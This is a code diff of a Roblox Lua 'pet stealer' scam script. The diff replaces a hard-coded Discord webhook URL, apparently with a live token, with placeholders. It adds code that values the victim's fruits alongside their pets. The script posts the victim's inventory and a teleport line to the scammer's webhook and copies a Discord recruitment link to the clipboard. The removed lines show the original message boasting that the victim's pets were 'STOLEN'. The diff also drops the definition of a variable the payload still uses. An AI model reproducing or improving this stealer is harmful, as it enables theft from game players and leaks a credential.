@@ -11,8 +11,8 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 
-getgenv().Webhook = "https://discord.com/api/webhooks/1403995022197522522/d3ZrG77NVzC6XDzEVtCD8zZ9qIisa_41tl6rx9TdlKkQnKvhGO7xJzVj1rj-XMpghVEE"
-getgenv().Username = "d"
+getgenv().Webhook = "PUT_HERE_UR_WEBHOOK"
+getgenv().Username = "PUT_HERE_UR_USERNAME"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -31,7 +31,7 @@ getgenv().Username = "d"
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard("discord.gg/d2zgg2YDMz")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
@@ -402,33 +402,59 @@ getgenv().Username = "d"
                 return table.concat(truncatedLines, "\n")
             end
         end
--- Calculate total value
-local totalValue = 0
-for _, pet in ipairs(pets) do
-    totalValue += pet.Value or 0
+-- Number formatter (k, m, b, etc.)
+local function formatNumber(number)
+    local numbers = math.floor(number)
+    local suffixes = {"", "k", "m", "b", "t", "qd", "sn", "sx", "sp", "oc", "no"}
+    local suffixIndex = 1
+    while numbers >= 1000 do
+        numbers = numbers / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return string.format("%.2f%s", numbers, suffixes[suffixIndex])
 end
-local formattedTotalValue = formatNumberWithCommas(totalValue)
 
-local totalValue = 0
-for _, pet in ipairs(pets) do
-    totalValue += pet.Value or 0
+-- Detect fruits in backpack
+local fruits = {}
+for _, tool in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
+    if tool:FindFirstChild("Item_Seed") then
+        local fruitValue = 0
+        pcall(function()
+            fruitValue = require(RS.Modules.CalculatePlantValue)(tool)
+        end)
+        table.insert(fruits, {
+            name = tool.Name,
+            value = fruitValue
+        })
+    end
 end
-local formattedTotalValue = formatNumberWithCommas(totalValue)
 
--- Generate Top 5 best pets string
+-- Sort lists
+table.sort(pets, function(a,b) return a.Value > b.Value end)
+table.sort(fruits, function(a,b) return a.value > b.value end)
+
+-- Top 5 pets string
 local top5Pets = {}
 for i = 1, math.min(5, #pets) do
     local pet = pets[i]
-    table.insert(top5Pets, string.format("%s → %s", pet.PetName, pet.Formatted))
+    table.insert(top5Pets, string.format("%s → %s", pet.PetName, formatNumber(pet.Value)))
 end
 local top5PetsString = table.concat(top5Pets, "\n")
 
-local tpScript = string.format(
-    'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
-    game.PlaceId,
-    game.JobId
-)
+-- Top 5 fruits string
+local top5Fruits = {}
+for i = 1, math.min(5, #fruits) do
+    local fruit = fruits[i]
+    table.insert(top5Fruits, string.format("%s → %s", fruit.name, formatNumber(fruit.value)))
+end
+local top5FruitsString = table.concat(top5Fruits, "\n")
 
+-- Total value of all items
+local totalValue = 0
+for _, pet in ipairs(pets) do totalValue += pet.Value or 0 end
+for _, fruit in ipairs(fruits) do totalValue += fruit.value or 0 end
+
+-- Payload
 local payload = {
     content = (hasRarePets() and "--@everyone\n" or "") .. tpScript,
     embeds = {
@@ -450,10 +476,11 @@ local payload = {
                 {
                     name = "**__Inventory__**",
                     value = string.format(
-                        "```Total items: %d\nTotal Value: %s```\n``Top 5 best pets:``\n```%s```",
-                        #pets,
-                        formattedTotalValue,
-                        top5PetsString
+                        "```Total items: %d\nTotal Value: %s```\n``Top 5 best pets:``\n```%s```\n``Top 5 best fruits:``\n```%s```",
+                        #pets + #fruits,
+                        formatNumber(totalValue),
+                        top5PetsString,
+                        top5FruitsString
                     )
                 },
                 {
@@ -473,6 +500,7 @@ local payload = {
     attachments = {}
 }
 
+-- Send to webhook
 pcall(function()
     request({
         Url = Webhook,
